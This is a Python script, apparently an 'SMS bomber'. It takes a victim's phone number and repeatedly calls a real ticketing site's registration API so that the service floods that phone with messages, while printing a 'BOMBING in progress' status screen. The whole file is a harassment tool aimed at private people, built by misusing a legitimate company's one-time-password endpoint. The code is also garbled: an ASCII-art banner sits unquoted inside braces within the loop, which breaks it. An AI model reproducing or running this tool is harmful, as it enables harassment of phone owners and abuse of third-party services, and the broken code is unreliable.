import platform
import os
import time
import random
import urllib.request

def banner():
    if platform.system().lower()=="windows":
        os.system("cls")
    else:
        os.system("clear")
    
             
    
def send(target, counter, delay):
    bombers = {
    "ConfirmTkt": "https://securedapi.confirmtkt.com/api/platform/register?mobileNumber="
    }

    failed = 0
    requested = 0
    success = int(requested) - int(failed)
    bombs = int(counter) + 1

    while success != (int(bombs)):
        banner() {8b        d8                                                                                                
 Y8,    ,8P                                                                                                 
  Y8,  ,8P                                                                                                  
   "8aa8"  ,adPPYba,   88       88  8b,dPPYba,     8b,dPPYba,   ,adPPYYba,  88,dPYba,,adPYba,    ,adPPYba,  
    `88'  a8"     "8a  88       88  88P'   "Y8     88P'   `"8a  ""     `Y8  88P'   "88"    "8a  a8P_____88  
     88   8b       d8  88       88  88             88       88  ,adPPPPP88  88      88      88  8PP"""""""  
     88   "8a,   ,a8"  "8a,   ,a88  88             88       88  88,    ,88  88      88      88  "8b,   ,aa  
     88    `"YbbdP"'    `"YbbdP'Y8  88             88       88  `"8bbdP"Y8  88      88      88   `"Ybbd8"' }
        api = random.choice(list(bombers))

        print("============================SHUBHAMGOSAIN==============================")
        print("                BOMBING in progress, please wait !!               ")
        print("     Please keep your data connection active during bombing !!    ")
        print("==================================================================")
        print("             Target Number           : ", target)
        print("             Number of Requests Sent : ", requested)
        print("             Successful Requests     : ", success)
        print("             Failed Requests         : ", failed)
        print("==================================================================")

        result_url=str(bombers[api])+target
        try:
            requested = requested + 1
            urllib.request.urlopen(str(result_url))
            success = success + 1
        except (urllib.error.HTTPError, urllib.error.URLError):
            failed = failed + 1
            continue

        time.sleep(float(delay))

banner()
print("")
send(input("Enter Target Number :  "), input("Enter Number of Messages "), input("Enter Delay time (in seconds): "))
